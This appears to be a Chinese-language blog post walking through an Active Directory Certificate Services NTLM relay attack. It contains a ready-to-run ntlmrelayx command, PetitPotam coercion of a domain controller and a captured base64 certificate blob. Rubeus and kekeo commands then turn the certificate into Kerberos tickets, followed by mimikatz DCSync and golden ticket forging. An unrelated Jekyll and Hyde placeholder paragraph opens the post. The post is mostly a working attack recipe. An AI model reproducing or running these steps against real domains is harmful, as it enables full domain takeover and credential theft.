---
layout: post
title: AD CS relay Attack
---

*The Strange Case of Dr. Jekyll and Mr. Hyde* tells the story of a lawyer investigating the connection of two persons, Dr. Henry Jekyll and Mr. Edward Hyde. Chief among the novel's supporting cast is a man by the name of Mr. Poole, Dr. Jekyll's loyal butler.

-----

## **ADCS 核心原理**

证书服务发布的部分证书可用于kerberos认证，并且在返回的PAC里面能拿到NTLM hash。

AD CS（Active Directory 证书服务）特别有趣，因为它提供默认接受基于 NTLM 的身份验证的角色服务。这些服务具体包括**证书颁发机构 Web 注册**和**证书注册 Web 服务**。

**注:要完成本次攻击域必须安装ADCS服务，且证书注册的web页面不能开启https。**

攻击机器上

python3 ntlmrelayx.py -debug -smb2support --target http://172.23.119.119/certsrv/certfnsh.asp --adcs --template KerberosAuthentication

![image-20210813111552386](https://gitee.com/a4m1n/tuchuang/raw/master/pic/image-20210813111552386.png)

内网一台已经有的据点或者攻击机也可以PetitPotam.exe 10.0.0.5 dc01，120连接的是辅域，打回辅域DC02的net-ntlm

![image-20210813111357522](https://gitee.com/a4m1n/tuchuang/raw/master/pic/image-20210813111357522.png)

![image-20210813111704436](https://gitee.com/a4m1n/tuchuang/raw/master/pic/image-20210813111704436.png)

`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`

keko利用

![image-20210813115049121](https://gitee.com/a4m1n/tuchuang/raw/master/pic/image-20210813115049121.png)

![image-20210813115314598](https://gitee.com/a4m1n/tuchuang/raw/master/pic/image-20210813115314598.png)

然后mimikatz dcsync即可

![image-20210813115227928](https://gitee.com/a4m1n/tuchuang/raw/master/pic/image-20210813115227928.png)

拥有 NTLM 哈希允许我们创建`krbtgt`[Kerberos Golden Tickets]()。

用rubeus 也可以  

.\Rubeus.exe asktgt /outfile:kirbi /user:Dc02$ /ptt /certificate:MIIRVQIBAzCCER /PTT

![image-20210813113100396](https://gitee.com/a4m1n/tuchuang/raw/master/pic/image-20210813113100396.png)

![image-20210813113521561](https://gitee.com/a4m1n/tuchuang/raw/master/pic/image-20210813113521561.png)

